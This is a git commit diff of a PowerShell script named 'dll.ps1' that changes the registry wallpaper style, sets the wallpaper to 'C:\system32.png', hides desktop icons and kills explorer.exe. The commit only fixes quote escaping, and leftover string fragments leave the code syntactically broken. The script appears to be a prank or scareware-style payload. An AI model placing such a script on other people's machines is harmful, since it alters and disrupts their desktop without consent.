39e3c920815458fcd19b3fa57deb3e23a49b1a49
andrepnunes <58053186+andrepnunes@users.noreply.github.com>
2021-11-30 01:26:06 +0100

    Update dll.ps1

--- dll.ps1
+++ dll.ps1
@@ -1,14 +1,14 @@
   Function Set-WallPaper($Image) {
-   New-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name WallpaperStyle -PropertyType String -Value \"10\"  -Force 
-  Add-Type -TypeDefinition @\" ")); 
+   New-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -PropertyType String -Value "10"  -Force 
+  Add-Type -TypeDefinition @" ")); 
   using System; 
   using System.Runtime.InteropServices;
   public class Params 
   { 
-      [DllImport(\"User32.dll\",CharSet=CharSet.Unicode)] 
+      [DllImport("User32.dll",CharSet=CharSet.Unicode)] 
       public static extern int SystemParametersInfo (Int32 uAction, Int32 uParam,String lpvParam,Int32 fuWinIni); 
   }
-  \"@ 
+  "@ 
     
       $SPI_SETDESKWALLPAPER = 0x0014
       $UpdateIniFile = 0x01
@@ -16,7 +16,7 @@
       $fWinIni = $UpdateIniFile -bor $SendChangeEvent
       $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
   }
-  $Path=\"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\" 
-  Set-ItemProperty -Path $Path -Name \"HideIcons\" -Value 1 
-  Get-Process \"explorer\" | Stop-Process "));
-  Set-WallPaper -Image \"C:\\system32.png\"
+  $Path="HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\" 
+  Set-ItemProperty -Path $Path -Name "HideIcons" -Value 1 
+  Get-Process "explorer" | Stop-Process "));
+  Set-WallPaper -Image "C:\system32.png"
